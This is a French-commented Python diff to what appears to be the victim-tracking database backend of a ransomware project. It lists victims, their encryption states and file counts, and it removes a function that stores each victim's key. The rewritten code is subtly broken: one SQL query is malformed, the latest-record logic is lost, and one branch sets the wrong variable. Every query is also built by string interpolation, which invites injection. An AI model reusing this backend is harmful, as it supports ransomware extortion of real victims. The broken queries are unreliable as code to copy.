@@ -52,58 +52,35 @@ def get_list_victims(conn):
     :param conn: la connexion déjà établie à la base de donnée
     :return: La liste des victimes
     """
-    query = '''
-    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
-    FROM (SELECT id_victim, MAX(datetime), state AS last_state
-    FROM states
-    GROUP BY id_victim) AS last_states
-    INNER JOIN victims ON victims.id_victim = last_states.id_victim
-        '''
-    victims = select_data(conn, query)  # victims[n][victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state ]
-
-    # victims_list contient la liste de toutes les victimes (id_victim, hash, os, disks, state, nb_files)
-    i = 0
+    commande = f'SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  FROM (SELECT id_victim, state AS last_state FROM states GROUP BY id_victim) AS last_states INNER JOIN victims ON victims.id_victim = last_states.id_victim'
+    victims = select_data(conn, commande)
+    x = 0
     victims_list = []
     for victim in victims:
         victims_list.append(list(victim))
         if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
-            query = f'''
-                SELECT encrypted.nb_files
-            FROM encrypted
-            WHERE encrypted.id_victim = {victim[0]}
-              AND encrypted.datetime = (SELECT MAX(datetime) 
-                                          FROM encrypted 
-                                         WHERE id_victim = {victim[0]})
-                '''
-            nb_files = select_data(conn, query)
-            if nb_files:
-                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            commande = f' SELECT encrypted.nb_files FROM encrypted ,WHERE encrypted.id_victim = {victim[0]} WHERE id_victim = {victim[0]}'
+            fichiers = select_data(conn, commande)
+            if fichiers:
+                fichiers = fichiers[0][0]
+            else:
+                fichiers = 0
+            victims_list[x].append(fichiers)
+        if victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
+            commande = f'SELECT decrypted.nb_files FROM decrypted WHERE decrypted.id_victim = {victim[0]}'
+            fichiers = select_data(conn, commande)
+            if fichiers:
+                fichiers = fichiers[0][0]
             else:
                 nb_files = 0
-            victims_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
-        elif victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
-            query = f'''
-                 SELECT decrypted.nb_files
-            FROM decrypted
-            WHERE decrypted.id_victim = {victim[0]}
-              AND decrypted.datetime = (SELECT MAX(datetime) 
-                                          FROM decrypted 
-                                         WHERE id_victim = {victim[0]})
-                '''
-            nb_files = select_data(conn, query)
-            if nb_files:
-                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
-            else:
-                nb_files = 0
-            victims_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
+            victims_list[x].append(fichiers)
         else:
-            victims_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
-        i += 1
-
+            victims_list[x].append(0)
+        x += 1
     return victims_list
 
 
-def get_list_history(conn,id_victim):
+def get_list_history(conn, id_victim):
     """
     Retourne l'historique correspondant à la victime 'id_victim'
     :param conn: la connexion déjà établie à la base de donnée
@@ -113,32 +90,3 @@ def get_list_history(conn,id_victim):
     select = f' SELECT id_state from states WHERE {id_victim} = id_state'
     list_history = select_data(conn, select)
     return list_history
-
-def new_victim(conn, hash_victim, os_victim, disk_victim, key_victim):
-    """
-    Enregistre une nouvelle victime dans la DB
-    :param conn: Connexion à la DB
-    :param hash_victim:
-    :param os_victim:
-    :param disk_victim:
-    :param key_victim:
-    :return: (int) le nouvel id_victim en DB
-    """
-    # Enregistrement de la nouvelle victime
-    data_victim = (os_victim, hash_victim, disk_victim, key_victim)
-    insert_data(conn, 'victims', '(os, hash, disks, key)', f'{data_victim}')
-
-    # Récupère l'ID de la nouvelle victime
-    query = f'''
-    SELECT victims.id_victim
-    from victims
-    where victims.hash = "{hash_victim}"
-    '''
-    id_victim = select_data(conn, query)
-    id_victim = id_victim[0][0]
-
-    # Enregistrement de l'état INITIALIZE
-    data_state = (id_victim, 'INITIALIZE')
-    insert_data(conn, 'states', '(id_victim, state)', f'{data_state}')
-
-    return id_victim
